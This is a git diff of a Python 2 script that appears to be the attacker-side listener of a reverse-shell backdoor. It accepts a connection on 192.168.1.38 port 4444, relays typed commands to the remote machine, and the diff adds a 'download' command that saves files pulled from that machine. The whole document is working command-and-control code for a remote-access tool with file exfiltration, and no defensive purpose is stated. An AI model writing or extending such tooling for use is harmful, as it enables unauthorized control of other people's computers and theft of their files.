@@ -4,6 +4,7 @@
 import socket
 import json
 
+
 class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -27,24 +28,27 @@ class Listener:
             except ValueError:
                 continue
 
-
     def execute_remotely(self, command):
         self.reliable_send(command)
         if command[0] == "exit":
             self.connection.close()
             exit()
-
         return self.reliable_receive()
-
-
+    
+    def write_file(self, path, content):
+        with open(path , "wb") as file:
+            file.write(content)  
+            return "[+] Download successful"
+     
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
             result = self.execute_remotely(command)
+            if command[0] == "download":
+                result = self.write_file(command[1], result)            
             print(result)
 
-    
 
 my_listener = Listener("192.168.1.38", 4444)
 my_listener.run()
